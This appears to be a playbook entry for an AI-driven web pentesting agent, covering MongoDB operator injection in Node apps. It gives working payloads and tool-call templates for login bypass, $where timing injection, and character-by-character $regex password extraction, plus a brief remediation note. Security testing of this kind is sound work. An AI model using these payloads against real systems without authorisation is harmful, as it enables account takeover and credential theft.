# NoSQL injection — MongoDB operator injection (Node)

Node + MongoDB (Mongoose) apps pass request data straight into a query object.
If a JSON value becomes an object of operators, you control the query. Test every
login / search / filter endpoint that accepts JSON.

1. **Auth bypass** — replace a string with an operator object. Send a raw JSON
   body with `http_request`:

       http_request(url:".../api/login", method:"POST",
         headers:{"Content-Type":"application/json"},
         body:'{"username":"admin","password":{"$ne":null}}')

   Variants: `{"$gt":""}`, `{"$ne":"x"}`, `{"$regex":"^a"}` (charwise password
   extraction), `{"$in":["a","b"]}`. A 200 / session cookie / token where bad
   creds give 401 ⇒ auth bypass.
2. **Query-string form** — Express `qs` / `body-parser({extended:true})` parses
   bracket keys into objects: urlencoded body `username=admin&password[$ne]=x`,
   or URL `?id[$gt]=0`. Reach it with `http_request`.
3. **`$where` / JS injection** — a field fed to `$where` runs server-side JS:
   `{"$where":"sleep(5000)"}` (timing) or `{"$where":"return true"}`. Confirm with
   the response-time delta. `$where` is disabled by default on MongoDB >=4.4/Atlas;
   if it silently no-ops, fall back to `$regex` extraction or `$expr`
   (`{"$expr":{"$eq":["$password","x"]}}`).
3b. **Automated $regex extraction** — extract an unknown value char-by-char
    with one `http_fuzz` per position: body
    `{"username":"admin","password":{"$regex":"^knownFUZZ"}}`, `payloads:` the
    alphabet, `match_status:200` (or the success indicator) flags the right
    char; append it to `known` and repeat for the next position.
4. **Sweep operators** with one `http_fuzz`: body
   `{"username":"admin","password":FUZZ}`,
   `payloads:['{"$ne":null}','{"$gt":""}','{"$regex":".*"}','{"$ne":"x"}']`,
   `match_status:200`. The hit is the working operator. (Quote the JSON so the
   marker substitutes a full object, not a string.)

Evidence: the operator request + the authenticated / leaked response.
Remediation: cast inputs to string (`String(req.body.x)`), reject objects where
scalars are expected (a Mongoose schema / `express-mongo-sanitize`), never pass
user input to `$where`.
